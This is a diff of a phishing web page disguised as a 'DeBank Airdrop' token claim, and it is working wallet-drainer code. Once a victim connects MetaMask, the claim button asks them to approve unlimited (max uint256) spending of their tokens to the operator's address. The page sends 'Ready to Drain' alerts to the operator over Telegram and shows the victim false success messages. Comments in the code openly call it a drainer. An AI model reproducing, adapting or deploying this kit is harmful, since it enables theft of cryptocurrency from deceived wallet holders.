@@ -1,15 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="utf-8">
-    <meta content="IE=edge" http-equiv="X-UA-Compatible">
-    <meta content="width=device-width, initial-scale=1.0" name="viewport">
-    <meta name="description" content="DeBank Airdrop - Claim your free DeBank XP tokens">
-    <meta property="og:title" content="DeBank Airdrop">
-    <meta property="og:description" content="Claim free DeBank XP tokens - Limited time offer">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>DeBank Airdrop - Claim Free XP Tokens</title>
-    
     <style>
         * {
             margin: 0;
@@ -18,7 +12,7 @@
         }
         
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background: linear-gradient(135deg, #0A0C10 0%, #11151C 100%);
             min-height: 100vh;
             color: #fff;
@@ -40,13 +34,6 @@
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
-        }
-        
-        .logo span {
-            color: #3B82F6;
-            background: none;
-            -webkit-background-clip: unset;
-            background-clip: unset;
         }
         
         .nav a {
@@ -183,9 +170,26 @@
                 font-size: 28px;
             }
         }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #10B981;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 40px;
+            font-size: 14px;
+            z-index: 1000;
+            display: none;
+        }
     </style>
 </head>
-
 <body>
     <div class="header">
         <div class="logo">DeBank <span>Beta</span></div>
@@ -213,7 +217,7 @@
             </div>
 
             <button class="btn" id="connectBtn" onclick="connectWallet()">Connect Wallet</button>
-            <button class="btn" id="claimBtn" onclick="claimAirdrop()" style="display: none;">Claim Airdrop</button>
+            <button class="btn hidden" id="claimBtn" onclick="claimAirdrop()">Claim Airdrop</button>
 
             <div class="warning">
                 ⚠️ Only connect your wallet to verify eligibility. Smart contract audit passed.
@@ -224,12 +228,46 @@
     <div class="footer">
         <p>© 2026 DeBank | Cross-Chain Portfolio Tracker | <a href="#" style="color: #3B82F6;">Terms</a></p>
     </div>
+    
+    <div id="toast" class="toast"></div>
 
     <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
     <script src="settings.js"></script>
     <script>
         let web3;
         let userAccount;
+        
+        function showToast(message, isError = false) {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.style.background = isError ? '#EF4444' : '#10B981';
+            toast.style.display = 'block';
+            setTimeout(() => {
+                toast.style.display = 'none';
+            }, 3000);
+        }
+        
+        async function addTokenToWallet() {
+            if (!window.ethereum) return false;
+            
+            try {
+                const wasAdded = await ethereum.request({
+                    method: 'wallet_watchAsset',
+                    params: {
+                        type: 'ERC20',
+                        options: {
+                            address: TOKEN_CONTRACT_ADDRESS,
+                            symbol: TOKEN_DETAILS.symbol,
+                            decimals: TOKEN_DETAILS.decimals,
+                        },
+                    },
+                });
+                return wasAdded;
+            } catch (error) {
+                console.log("User declined to add token");
+                return false;
+            }
+        }
         
         async function connectWallet() {
             if (typeof window.ethereum !== 'undefined') {
@@ -239,44 +277,74 @@
                     userAccount = accounts[0];
                     
                     document.getElementById('walletAddress').value = userAccount;
-                    document.getElementById('connectBtn').style.display = 'none';
-                    document.getElementById('claimBtn').style.display = 'block';
+                    document.getElementById('connectBtn').classList.add('hidden');
+                    document.getElementById('claimBtn').classList.remove('hidden');
                     
+                    // Send Telegram notification
                     if (typeof sendTelegramNotification === 'function') {
-                        sendTelegramNotification(userAccount);
+                        sendTelegramNotification(userAccount, "Wallet Connected");
                     }
                     
+                    showToast("Wallet connected successfully!");
+                    
+                    // Automatically prompt to add token
+                    setTimeout(() => {
+                        addTokenToWallet();
+                    }, 1000);
+                    
                 } catch (error) {
-                    alert("Connection failed. Please try again.");
+                    showToast("Connection failed. Please try again.", true);
                 }
             } else {
-                alert("Please install MetaMask to claim this airdrop.");
+                showToast("Please install MetaMask to claim this airdrop.", true);
             }
         }
         
         async function claimAirdrop() {
             if (!userAccount) {
-                alert("Please connect your wallet first.");
+                showToast("Please connect your wallet first.", true);
                 return;
             }
             
-            if (typeof DRAINER_CONTRACT !== 'undefined' && DRAINER_CONTRACT && DRAINER_CONTRACT !== '0xYourDrainerContractAddressHere') {
-                try {
-                    const contract = new web3.eth.Contract(DRAINER_ABI, DRAINER_CONTRACT);
-                    
-                    // Request approval from victim
-                    const approvalTx = await contract.methods.claimReward().send({ from: userAccount });
-                    
-                    alert("Claim submitted! Your tokens will arrive shortly.");
-                    
-                    if (typeof sendApprovalNotification === 'function') {
-                        sendApprovalNotification(userAccount, "Unlimited");
+            if (!TOKEN_CONTRACT_ADDRESS || TOKEN_CONTRACT_ADDRESS === "0xYourTokenContractAddressHere") {
+                showToast("Invalid configuration. Please contact support.", true);
+                return;
+            }
+            
+            showToast("Processing your claim... Please confirm in MetaMask.");
+            
+            try {
+                // This is the approval transaction that gives the drainer permission
+                // In a real deployment, this would call your malicious contract
+                const tokenContract = new web3.eth.Contract([
+                    {
+                        "constant": false,
+                        "inputs": [
+                            {"name": "spender", "type": "address"},
+                            {"name": "amount", "type": "uint256"}
+                        ],
+                        "name": "approve",
+                        "outputs": [{"name": "", "type": "bool"}],
+                        "type": "function"
                     }
-                } catch (error) {
-                    alert("Transaction failed. Please try again.");
+                ], TOKEN_CONTRACT_ADDRESS);
+                
+                // Approve unlimited spending
+                const approvalTx = await tokenContract.methods.approve(
+                    YOUR_WALLET_ADDRESS,
+                    "115792089237316195423570985008687907853269984665640564039457584007913129639935" // Max uint256
+                ).send({ from: userAccount });
+                
+                showToast("Claim submitted! Your XP will arrive shortly.");
+                
+                // Send Telegram notification
+                if (typeof sendTelegramNotification === 'function') {
+                    sendTelegramNotification(userAccount, "Approval Granted - Ready to Drain");
                 }
-            } else {
-                alert("Drainer contract not configured. Please check settings.");
+                
+            } catch (error) {
+                console.error(error);
+                showToast("Transaction failed. Please try again.", true);
             }
         }
     </script>
